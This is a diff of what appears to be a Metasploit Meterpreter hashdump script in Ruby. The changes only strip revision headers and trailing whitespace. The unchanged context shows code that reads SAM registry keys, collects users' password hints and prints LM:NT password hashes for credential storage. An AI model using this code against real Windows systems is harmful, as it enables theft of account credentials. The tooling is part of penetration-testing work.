@@ -1,5 +1,3 @@
-# $Id$
-# $Revision$
 #
 # Implement pwdump (hashdump) through registry reads + syskey
 
@@ -101,14 +99,14 @@ def capture_user_keys
 		users[usr.to_i(16)] ||={}
 		users[usr.to_i(16)][:F] = uk.query_value("F").data
 		users[usr.to_i(16)][:V] = uk.query_value("V").data
-		
+
 		#Attempt to get Hints (from Win7/Win8 Location)
 		begin
 			users[usr.to_i(16)][:UserPasswordHint] = decode_windows_hint(uk.query_value("UserPasswordHint").data.unpack("H*")[0])
 		rescue ::Rex::Post::Meterpreter::RequestError
 			users[usr.to_i(16)][:UserPasswordHint] = nil
 		end
-		
+
 		uk.close
 	end
 	ok.close
@@ -120,9 +118,9 @@ def capture_user_keys
 		rid = r.type
 		users[rid] ||= {}
 		users[rid][:Name] = usr
-		
+
 		#Attempt to get Hints (from WinXP Location) only if it's not set yet
-		if users[rid][:UserPasswordHint].nil?	
+		if users[rid][:UserPasswordHint].nil?
 			begin
 				uk_hint = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
 				users[rid][:UserPasswordHint] = uk_hint.query_value("").data
@@ -130,7 +128,7 @@ def capture_user_keys
 				users[rid][:UserPasswordHint] = nil
 			end
 		end
-		
+
 		uk.close
 	end
 	ok.close
@@ -262,9 +260,9 @@ if client.platform =~ /win32|win64/
 			if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
 				print_line "#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\""
 				hint_count += 1
-			end	
+			end
 		end
-		print_line("No users with password hints on this system") if hint_count == 0 
+		print_line("No users with password hints on this system") if hint_count == 0
 		print_line()
 
 		print_status("Dumping password hashes...")
@@ -280,9 +278,9 @@ if client.platform =~ /win32|win64/
 				:pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
 				:type  => "smb_hash"
 			)
-			
+
 			print_line hashstring
-			
+
 		end
 		print_line()
 		print_line()
